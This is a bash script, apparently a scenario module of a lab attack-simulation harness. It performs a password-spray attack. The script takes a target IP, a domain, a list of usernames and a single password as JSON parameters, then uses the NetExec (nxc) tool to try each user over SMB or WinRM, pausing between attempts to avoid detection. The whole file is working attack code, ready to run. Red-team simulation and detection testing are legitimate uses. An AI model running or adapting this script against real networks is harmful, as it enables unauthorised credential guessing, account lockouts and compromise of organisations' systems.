#!/usr/bin/env bash
set -u

RUN_ID="${1:-}"
PARAMS_JSON="${2:-}"
if [ -z "$PARAMS_JSON" ]; then
  PARAMS_JSON='{}'
fi


read_json() {
  local key="$1"
  local default="${2:-}"

  PARAMS_JSON_ENV="$PARAMS_JSON" KEY_ENV="$key" DEFAULT_ENV="$default" python3 - <<'PY'
import json
import os

raw = os.environ.get("PARAMS_JSON_ENV", "{}")
key = os.environ.get("KEY_ENV", "")
default = os.environ.get("DEFAULT_ENV", "")

try:
    data = json.loads(raw)
except Exception as e:
    print(default)
    raise SystemExit(0)

value = data.get(key, default)
if value is None:
    value = default
print(value)
PY
}

TARGET_IP="$(read_json target_ip)"
DOMAIN="$(read_json domain LAB)"
USERNAMES_RAW="$(read_json usernames)"
PASSWORD="$(read_json password)"
PROTOCOL="$(read_json protocol smb)"
DELAY_SECONDS="$(read_json delay_seconds 5)"

echo "[INFO] run_id=$RUN_ID"
echo "[INFO] scenario=password_spray"
echo "[INFO] target_ip=$TARGET_IP"
echo "[INFO] domain=$DOMAIN"
echo "[INFO] protocol=$PROTOCOL"
echo "[INFO] delay_seconds=$DELAY_SECONDS"

if [ -z "$TARGET_IP" ] || [ -z "$DOMAIN" ] || [ -z "$USERNAMES_RAW" ] || [ -z "$PASSWORD" ]; then
  echo "[ERROR] required params missing: target_ip/domain/usernames/password"
  exit 1
fi

NXC_BIN="/home/ubuntu/.local/bin/nxc"

if [ ! -x "$NXC_BIN" ]; then
  echo "[ERROR] nxc not found at $NXC_BIN"
  exit 1
fi


TMP_USERS="$(mktemp)"

printf "%s\n" "$USERNAMES_RAW" \
  | tr ',' '\n' \
  | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' \
  | sed '/^$/d' > "$TMP_USERS"

USER_COUNT="$(wc -l < "$TMP_USERS" | tr -d ' ')"
echo "[INFO] loaded_users=$USER_COUNT"

if [ "$USER_COUNT" -eq 0 ]; then
  echo "[ERROR] no usernames provided"
  rm -f "$TMP_USERS"
  exit 1
fi

while IFS= read -r USERNAME; do
  echo "[INFO] trying user=$USERNAME"

  FULL_USER="${DOMAIN}\\${USERNAME}"

  if [ "$PROTOCOL" = "smb" ]; then
    echo "[DEBUG] command: $NXC_BIN smb $TARGET_IP -u '$FULL_USER' -p '***' --shares"
    "$NXC_BIN" smb "$TARGET_IP" -u "$FULL_USER" -p "$PASSWORD" --shares || true

  elif [ "$PROTOCOL" = "winrm" ]; then
    "$NXC_BIN" winrm "$TARGET_IP" -u "$FULL_USER" -p "$PASSWORD" --timeout 20 || true

  else
    echo "[ERROR] unsupported protocol: $PROTOCOL"
    rm -f "$TMP_USERS"
    exit 1
  fi

  sleep "$DELAY_SECONDS"
done < "$TMP_USERS"

rm -f "$TMP_USERS"

echo "[INFO] password spray completed"
exit 0